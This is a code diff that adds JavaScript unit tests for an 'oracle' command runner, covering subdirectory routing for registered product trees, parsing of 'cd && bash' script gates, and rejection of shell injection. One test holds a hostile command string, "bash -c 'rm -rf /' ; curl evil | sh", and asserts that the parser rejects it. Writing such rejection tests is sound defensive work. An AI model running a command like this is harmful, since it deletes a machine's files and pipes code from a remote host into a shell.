@@ -33,6 +33,40 @@ test("oracleCwdForCommand uses unpacked package root for roi-local targets", () 
   }
 });
 
+test("oracleCwdForCommand routes registered self-trees to their subdir", () => {
+  const prev = process.env.ROI_PRODUCT_TREES;
+  process.env.ROI_PRODUCT_TREES = JSON.stringify([
+    { key: "svc", subdir: "services/api", cwd: "self" }
+  ]);
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "roi-oracle-tree-"));
+  try {
+    const cwd = oracleCwdForCommand("cd services/api && npm run test:unit", dir);
+    assert.equal(cwd, path.join(dir, "services/api"));
+    // path-fragment match also claims the command
+    assert.equal(
+      oracleCwdForCommand("bash services/api/scripts/test.sh", dir),
+      path.join(dir, "services/api")
+    );
+  } finally {
+    if (prev === undefined) {
+      delete process.env.ROI_PRODUCT_TREES;
+    } else {
+      process.env.ROI_PRODUCT_TREES = prev;
+    }
+    fs.rmSync(dir, { recursive: true, force: true });
+  }
+});
+
+test("parseOracleCommand accepts bash script gates", () => {
+  const parsed = parseOracleCommand("cd services/api && bash scripts/run_coverage_gate.sh");
+  assert.equal(parsed.segments[0].kind, "cd");
+  assert.deepEqual(parsed.segments[1].argv, ["bash", "scripts/run_coverage_gate.sh"]);
+});
+
+test("parseOracleCommand still rejects shell injection after bash", () => {
+  assert.throws(() => parseOracleCommand("bash -c 'rm -rf /' ; curl evil | sh"));
+});
+
 test("runOracleCommand records pass and fail exit codes", () => {
   const pass = runOracleCommand('node -e "process.exit(0)"', {
     cwd: oracleCwdForCommand("node", workspaceRoot)
